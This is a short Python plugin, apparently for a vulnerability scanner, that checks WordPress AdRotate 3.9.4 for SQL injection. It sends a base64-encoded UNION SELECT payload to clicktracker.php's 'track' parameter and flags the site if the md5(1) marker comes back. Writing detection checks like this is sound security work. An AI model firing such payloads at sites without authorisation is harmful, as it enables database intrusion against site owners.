# -*- coding=utf-8 -*-
# WordPress AdRotate Plugin 3.9.4 sqli
import re 
import urlparse 
#_Author_= syc4mor3
#_PlugName_ = WordPress AdRotate Plugin 3.9.4 - (clicktracker.php track param) SQL Injection
#_FileName_ = adrotate.py
#_Refer_ = https://www.exploit-db.com/exploits/31834/

    
def assign(service, arg): 
    if service != "wordpress": 
        return
    return True,arg 
    
def audit(arg):
    payload = "wp-content/plugins/adrotate/library/clicktracker.php?track=LTEgdW5pb24gc2VsZWN0IG1kNSgxKSwxLDEsMQ=="
    verify_url = arg + payload
    code, head,res, errcode, _ = curl.curl(verify_url)
    if code == 302 and "c4ca4238a0b923820dcc509a6f75849b" in head:
        security_hole(verify_url)
 
        
if __name__ == '__main__': 
    from dummy import *
    audit(assign('wordpress', 'http://localhost/wordpress/')[1])